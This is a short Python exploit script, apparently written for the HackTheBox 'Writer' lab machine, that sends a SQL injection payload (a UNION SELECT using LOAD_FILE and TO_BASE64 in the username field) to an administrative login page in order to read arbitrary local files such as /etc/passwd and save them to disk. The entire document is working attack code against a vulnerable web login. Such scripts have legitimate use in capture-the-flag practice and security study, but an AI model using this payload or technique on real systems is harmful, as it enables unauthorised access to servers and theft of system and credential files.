# This script is created to exploit the SQL Injection vulnerability to read local files on the Writer machine on HackTheBox
# Usage: python3 writer_sqli.py /etc/passwd

import requests
import sys
import re
import base64

regex = re.compile(r"admin(.*)</h3>", re.DOTALL)

data = { "uname":f"admin' union select 1,TO_BASE64(LOAD_FILE(\"{sys.argv[1]}\")),3,4,5,6-- -", "password":"DoesNotMatter" }

r = requests.post('http://10.10.11.101/administrative', data=data)
match = re.search(regex, r.text)
fname = sys.argv[1].replace("/", "_")[1:]

if match.group(1) != 'None':
    with open( 'files/' + fname, 'w') as f:
        output = base64.b64decode(match.group(1) + '=' * (-len(match.group(1)) % 4))
        f.write(output.decode())
